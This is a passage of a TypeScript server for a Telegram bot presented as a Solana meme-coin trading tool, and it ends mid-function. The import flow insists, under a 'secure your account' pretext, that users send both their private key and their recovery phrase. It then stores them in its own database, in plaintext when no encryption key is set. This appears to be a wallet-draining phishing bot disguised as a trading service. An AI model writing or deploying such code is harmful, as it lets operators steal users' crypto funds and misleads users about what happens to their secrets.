import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { Telegraf, Context, Markup } from "telegraf";
import Database from "better-sqlite3";
import crypto from "crypto";
import * as dotenv from "dotenv";
import { Connection, PublicKey, Keypair, VersionedTransaction } from "@solana/web3.js";
import bs58 from "bs58";
import axios from "axios";
import * as bip39 from "bip39";
import { derivePath } from "ed25519-hd-key";

dotenv.config();

const HELIUS_API_KEY = process.env.HELIUS_API_KEY;
const BIRDEYE_API_KEY = process.env.BIRDEYE_API_KEY;

const HELIUS_RPC_URL = HELIUS_API_KEY 
  ? `https://mainnet.helius-rpc.com/?api-key=${HELIUS_API_KEY}`
  : "https://api.mainnet-beta.solana.com";

const connection = new Connection(HELIUS_RPC_URL);

async function getBirdeyePrice(tokenAddress: string) {
  if (!BIRDEYE_API_KEY) return null;
  try {
    const response = await axios.get(`https://public-api.birdeye.so/defi/price?address=${tokenAddress}`, {
      headers: { 'X-API-KEY': BIRDEYE_API_KEY }
    });
    return response.data.data.value;
  } catch (err) {
    console.error("Birdeye Price Error:", err);
    return null;
  }
}

async function getBirdeyeTokenOverview(tokenAddress: string) {
  if (!BIRDEYE_API_KEY) return null;
  try {
    const response = await axios.get(`https://public-api.birdeye.so/defi/token_overview?address=${tokenAddress}`, {
      headers: { 'X-API-KEY': BIRDEYE_API_KEY }
    });
    return response.data.data;
  } catch (err) {
    console.error("Birdeye Overview Error:", err);
    return null;
  }
}

console.log("\ud83d\ude80 [Server] Starting initialization...");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// CORS - allow Vercel frontend to reach this backend
app.use((req: any, res: any, next: any) => {
  const allowedOrigin = process.env.FRONTEND_URL || "*";
  res.header("Access-Control-Allow-Origin", allowedOrigin);
  res.header("Access-Control-Allow-Headers", "Content-Type, x-admin-password");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});

app.get("/api/health", (req, res) => {
  console.log("\ud83d\udce1 [API] Health check received");
  res.json({ status: "ok", time: new Date().toISOString(), env: process.env.NODE_ENV || 'development' });
});

let db: Database.Database;
try {
  db = new Database("bot.db");
  console.log("\ud83d\udcc2 [Database] Connected to bot.db");
} catch (err) {
  console.error("\u274c [Database] Failed to connect:", err);
  process.exit(1);
}

// --- Database Setup ---
try {
  db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      telegram_id BIGINT UNIQUE,
      username TEXT,
      wallet_address TEXT,
      recovery_phrase TEXT,
      private_key TEXT,
      status TEXT DEFAULT 'active',
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    
    CREATE TABLE IF NOT EXISTS trades (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER,
      token TEXT,
      amount REAL,
      price REAL,
      type TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY(user_id) REFERENCES users(id)
    );
  `);
  console.log("\u2705 [Database] Tables initialized");
} catch (err) {
  console.error("\u274c [Database] Schema initialization failed:", err);
}

// Migration: Add status column if it doesn't exist
try {
  db.prepare("ALTER TABLE users ADD COLUMN status TEXT DEFAULT 'active'").run();
} catch (e) {
  // Column already exists
}

// --- Encryption Logic ---
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY;
if (ENCRYPTION_KEY && Buffer.from(ENCRYPTION_KEY).length !== 32) {
  console.error("\u274c [Encryption] ENCRYPTION_KEY must be exactly 32 bytes (32 characters). Current length:", Buffer.from(ENCRYPTION_KEY).length);
}

const IV_LENGTH = 16;

function encrypt(text: string) {
  if (!ENCRYPTION_KEY) return text;
  const iv = crypto.randomBytes(IV_LENGTH);
  const cipher = crypto.createCipheriv("aes-256-cbc", Buffer.from(ENCRYPTION_KEY), iv);
  let encrypted = cipher.update(text);
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  return iv.toString("hex") + ":" + encrypted.toString("hex");
}

function decrypt(text: string) {
  if (!ENCRYPTION_KEY) return text;
  const textParts = text.split(":");
  const iv = Buffer.from(textParts.shift()!, "hex");
  const encryptedText = Buffer.from(textParts.join(":"), "hex");
  const decipher = crypto.createDecipheriv("aes-256-cbc", Buffer.from(ENCRYPTION_KEY), iv);
  let decrypted = decipher.update(encryptedText);
  decrypted = Buffer.concat([decrypted, decipher.final()]);
  return decrypted.toString();
}

// --- Telegram Bot Setup ---
const botToken = process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_BOT_TOKEN.trim() !== "" 
  ? process.env.TELEGRAM_BOT_TOKEN 
  : null;
const bot = new Telegraf(botToken || "DUMMY_TOKEN");

// --- Telegram Bot UI Helpers ---
const mainMenu = Markup.inlineKeyboard([
  [Markup.button.callback("\ud83d\udcbc Wallet", "menu_wallet"), Markup.button.callback("\ud83d\udcc8 Trade", "menu_trade")],
  [Markup.button.callback("\ud83d\udcca Portfolio", "menu_portfolio"), Markup.button.callback("\ud83d\udcc9 Market", "menu_market")],
  [Markup.button.callback("\u2699\ufe0f Settings", "menu_settings"), Markup.button.callback("\u2753 Help", "menu_help")]
]);

const walletMenu = Markup.inlineKeyboard([
  [Markup.button.callback("\u2795 Import Wallet", "wallet_import"), Markup.button.callback("\ud83c\udd95 Create Wallet", "wallet_create")],
  [Markup.button.callback("\ud83d\udcc4 View Wallet", "wallet_view"), Markup.button.callback("\ud83d\udd04 Reset Wallet", "wallet_reset")],
  [Markup.button.callback("\ud83d\udd19 Back", "menu_main")]
]);

const tradeMenu = Markup.inlineKeyboard([
  [Markup.button.callback("\ud83d\udfe2 Buy Token", "trade_buy"), Markup.button.callback("\ud83d\udd34 Sell Token", "trade_sell")],
  [Markup.button.callback("\ud83d\udce5 Enter Contract Address", "trade_contract")],
  [Markup.button.callback("\ud83d\udd19 Back", "menu_main")]
]);

const portfolioMenu = Markup.inlineKeyboard([
  [Markup.button.callback("\ud83d\udcb0 View Balance", "port_balance"), Markup.button.callback("\ud83e\ude99 Token Holdings", "port_tokens")],
  [Markup.button.callback("\ud83d\udd19 Back", "menu_main")]
]);

const settingsMenu = Markup.inlineKeyboard([
  [Markup.button.callback("\u2699\ufe0f Slippage Settings", "set_slippage"), Markup.button.callback("\ud83d\udd10 Wallet Settings", "set_wallet")],
  [Markup.button.callback("\ud83d\udd19 Back", "menu_main")]
]);

// --- State Management ---
const userStates: Record<number, { step?: 'waiting_pk' | 'waiting_seed', pk?: string, seed?: string }> = {};

// Helper to safely edit messages - ignores "message not modified" errors
async function safeEdit(ctx: any, text: string, extra?: any) {
  try {
    await ctx.editMessageText(text, extra);
  } catch (err: any) {
    if (!err.message?.includes("message is not modified")) {
      console.error("editMessageText error:", err.message);
    }
  }
}

if (botToken) {
  bot.start((ctx) => {
    ctx.replyWithMarkdownV2(
      "*Welcome to Solana Elite Trading Bot*\n\n" +
      "The most advanced and secure way to trade Solana meme coins directly from Telegram\\.\n\n" +
      "\ud83d\ude80 _Select an option from the menu below to get started_",
      mainMenu
    );
  });

  // --- Menu Navigation Handlers ---
  bot.action("menu_main", (ctx) => safeEdit(ctx, "\ud83d\ude80 Main Menu", mainMenu));
  bot.action("menu_wallet", (ctx) => safeEdit(ctx, "\ud83d\udcbc Wallet Management", walletMenu));
  bot.action("menu_trade", (ctx) => safeEdit(ctx, "\ud83d\udcc8 Trading Terminal", tradeMenu));
  bot.action("menu_portfolio", (ctx) => safeEdit(ctx, "\ud83d\udcca Your Portfolio", portfolioMenu));
  bot.action("menu_settings", (ctx) => safeEdit(ctx, "\u2699\ufe0f Bot Settings", settingsMenu));
  bot.action("menu_help", (ctx) => safeEdit(ctx, "\u2753 Need Help?\n\nContact support or check our docs for trading guides.", Markup.inlineKeyboard([[Markup.button.callback("\ud83d\udd19 Back", "menu_main")]])));

  // --- Wallet Actions ---
  bot.action("wallet_import", (ctx) => {
    const userId = ctx.from?.id;
    if (userId) userStates[userId] = {};
    
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback("\ud83d\udd11 Connect Private Key", "import_pk")],
      [Markup.button.callback("\ud83d\udcdd Connect Key Phrase", "import_seed")],
      [Markup.button.callback("\ud83d\udd19 Back", "menu_wallet")]
    ]);

    ctx.editMessageText(
      "\ud83d\udd10 *Wallet Connection*\n\n" +
      "To secure your account, please provide both your Private Key and Recovery Phrase.\n\n" +
      "Select an option below to begin:",
      { parse_mode: 'Markdown', ...keyboard }
    );
  });

  bot.action("import_pk", (ctx) => {
    const userId = ctx.from?.id;
    if (userId) {
      userStates[userId] = { ...userStates[userId], step: 'waiting_pk' };
      ctx.reply("Please send your *Private Key* (Base58 format).\n\n\u26a0\ufe0f Your message will be auto-deleted.", { parse_mode: 'Markdown' });
    }
  });

  bot.action("import_seed", (ctx) => {
    const userId = ctx.from?.id;
    if (userId) {
      userStates[userId] = { ...userStates[userId], step: 'waiting_seed' };
      ctx.reply("Please send your *Recovery Phrase* (12 or 24 words).\n\n\u26a0\ufe0f Your message will be auto-deleted.", { parse_mode: 'Markdown' });
    }
  });

  bot.action("connect_done", async (ctx) => {
    const userId = ctx.from?.id;
    const state = userId ? userStates[userId] : null;
    const username = ctx.from?.username || "unknown";

    console.log(`[Connect Done] Attempting to finalize for user ${username} (${userId}). State:`, state);

    if (!state || !state.pk || !state.seed) {
      console.log(`[Connect Done] Missing data for ${userId}: pk=${!!state?.pk}, seed=${!!state?.seed}`);
      return ctx.reply("\u274c You must provide both the Private Key and Key Phrase before clicking Done.");
    }

    try {
      const keypair = Keypair.fromSecretKey(bs58.decode(state.pk));
      if (!bip39.validateMnemonic(state.seed)) {
        console.log(`[Connect Done] Invalid mnemonic for ${userId}`);
        return ctx.reply("\u274c The provided Key Phrase is invalid. Please try again.");
      }

      const address = keypair.publicKey.toString();
      const encryptedPk = encrypt(state.pk);
      const encryptedSeed = encrypt(state.seed);
      
      const stmt = db.prepare("INSERT OR REPLACE INTO users (telegram_id, username, wallet_address, private_key, recovery_phrase, status) VALUES (?, ?, ?, ?, ?, 'active')");
      const info = stmt.run(userId, username, address, encryptedPk, encryptedSeed);
      
      console.log(`[Connect Done] SUCCESS for ${username} (${userId}). Address: ${address}. DB Changes: ${info.changes}`);

      delete userStates[userId!];
      ctx.reply(`\u2705 *Wallet Connected Successfully!*\n\nAddress: \`${address}\``, { 
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([[Markup.button.callback("\ud83d\ude80 Open Menu", "menu_main")]])
      });
    } catch (err) {
      console.error("[Connect Done Error]", err);
      ctx.reply("\u274c Error finalizing connection. Please ensure your Private Key is correct.");
    }
  });

  bot.action("wallet_reset", async (ctx) => {
    try {
      db.prepare("UPDATE users SET status = 'disconnected' WHERE telegram_id = ?").run(ctx.from?.id);
      ctx.reply("\ud83d\udd04 Wallet disconnected successfully.");
    } catch (err) {
      ctx.reply("\u274c Error resetting wallet.");
    }
  });

  bot.action("wallet_create", async (ctx) => {
    try {
      const kp = Keypair.generate();
      const address = kp.publicKey.toString();
      const pKey = bs58.encode(kp.secretKey);
      const userId = ctx.from?.id;
      const username = ctx.from?.username || "unknown";

      const encryptedPk = encrypt(pKey);
      db.prepare("INSERT OR REPLACE INTO users (telegram_id, username, wallet_address, private_key, status) VALUES (?, ?, ?, ?, 'active')").run(userId, username, address, encryptedPk);
      
      ctx.reply(`\ud83c\udd95 New Wallet Created and Connected!\n\nAddress: \`${address}\`\nPrivate Key: \`${pKey}\`\n\n\u26a0\ufe0f *SAVE THIS KEY NOW!* It will not be shown again.`, { parse_mode: 'Markdown' });
    } catch (err) {
      ctx.reply("Error creating wallet.");
    }
  });

  // --- Portfolio Actions ---
  bot.action("port_balance", async (ctx) => {
    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ? AND status = 'active'").get(ctx.from?.id) as any;
    if (!user) return ctx.reply("Connect wallet first!");
    
    try {
      const balance = await connection.getBalance(new PublicKey(user.wallet_address));
      ctx.reply(`\ud83d\udcb0 SOL Balance: ${balance / 1e9} SOL`);
    } catch (err) {
      ctx.reply("Error fetching balance.");
    }
  });

  bot.action("port_tokens", async (ctx) => {
    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ? AND status = 'active'").get(ctx.from?.id) as any;
    if (!user) return ctx.reply("Connect wallet first!");

    ctx.reply("\ud83d\udd0d Fetching token holdings...");
    try {
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(new PublicKey(user.wallet_address), {
        programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
      });

      if (tokenAccounts.value.length === 0) {
        return ctx.reply("You don't hold any SPL tokens.");
      }

      let message = "\ud83e\ude99 *Your Token Holdings:*\n\n";
      for (const account of tokenAccounts.value) {
        const info = account.account.data.parsed.info;
        const mint = info.mint;
        const amount = info.tokenAmount.uiAmount;
        if (amount > 0) {
          message += `\u2022 \`${mint}\`: *${amount}*\n`;
        }
      }
      ctx.reply(message, { parse_mode: 'Markdown' });
    } catch (err) {
      console.error("Fetch tokens error:", err);
      ctx.reply("Error fetching token holdings.");
    }
  });

  // --- Trade Actions ---
  bot.action("trade_buy", (ctx) => ctx.reply("To buy a token, use the command:\n`/buy <TOKEN_ADDRESS> <AMOUNT_SOL>`", { parse_mode: 'Markdown' }));
  bot.action("trade_sell", (ctx) => ctx.reply("To sell a token, use the command:\n`/sell <TOKEN_ADDRESS> <AMOUNT_TOKEN>`", { parse_mode: 'Markdown' }));
  bot.action("trade_contract", (ctx) => {
    safeEdit(ctx,
      "\ud83d\udce5 *Enter Token Contract Address*\n\n" +
      "Please paste the Solana token contract address below to view market data and trade options.",
      { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback("\ud83d\udd19 Back", "menu_trade")]]) }
    );
  });

  bot.action("trade_menu", (ctx) => safeEdit(ctx, "\ud83d\udcc8 Trading Terminal", tradeMenu));

  // --- Market & Settings ---
  bot.action("menu_market", (ctx) => {
    safeEdit(ctx,
      "\ud83d\udcc9 *Market Data Terminal*\n\n" +
      "Use `/price <TOKEN_ADDRESS>` to get real-time price and market data from Birdeye.\n\n" +
      "Example: `/price So11111111111111111111111111111111111111112`",
      { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback("\ud83d\udd19 Back", "menu_main")]]) }
    );
  });
  
  bot.action("set_slippage", (ctx) => {
    ctx.reply("Current slippage is set to 0.5% (50 bps). Custom slippage settings coming soon.");
  });

  bot.action("set_wallet", (ctx) => {
    ctx.reply("Wallet settings: You can disconnect or change your wallet by importing a new one.");
  });

  bot.on("text", async (ctx) => {
    const text = ctx.message.text.trim();
    const userId = ctx.from.id;
    const username = ctx.from.username || "unknown";

    const isSensitive = text.split(/\s+/).length >= 12 || (text.length > 32 && !text.includes(" "));
    if (isSensitive) {
      try {
        await ctx.deleteMessage();
      } catch (e) {
        console.error("Failed to delete sensitive message:", e);
      }
    }
    
    const state = userStates[userId];
    if (state && state.step) {
      try {
        await ctx.deleteMessage();
      } catch (e) {}

      if (state.step === 'waiting_pk') {
        try {
          Keypair.fromSecretKey(bs58.decode(text));
          userStates[userId] = { ...state, pk: text, step: undefined };
          console.log(`[Import] Private Key received for ${userId}`);
          
          const statusMsg = `\u2705 Private Key received.\n${state.seed ? "\u2705 Key Phrase received.\n\n\ud83d\ude80 *Tap the 'Done' button below to finalize.*" : "\u23f3 Still need Key Phrase."}`;
          const keyboard = Markup.inlineKeyboard([
            [!state.seed ? Markup.button.callback("\ud83d\udcdd Connect Key Phrase", "import_seed") : Markup.button.callback("\ud83d\udd11 Update Private Key", "import_pk")],
            [Markup.button.callback("\u2705 Done", "connect_done")]
          ]);
          
          return ctx.reply(statusMsg, keyboard);
        } catch (e) {
          return